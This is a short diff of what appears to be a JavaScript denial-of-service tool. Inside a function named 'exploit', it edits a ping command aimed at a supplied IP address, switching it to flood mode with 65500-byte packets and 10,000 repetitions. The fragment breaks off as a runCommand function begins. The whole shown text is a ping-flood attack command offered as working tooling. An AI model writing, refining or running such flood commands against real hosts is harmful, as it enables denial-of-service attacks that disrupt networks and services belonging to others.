@@ -14,7 +14,7 @@ const art = `
 `;
 
 function exploit(IP) {
-  const cmd = `ping -i 0.005 -s 65500 -c 10000 -vv ${IP}`;
+  const cmd = `ping -f -i 1 -s 65500 -c 10000 -vv ${IP}`;
 
   function runCommand() {
         
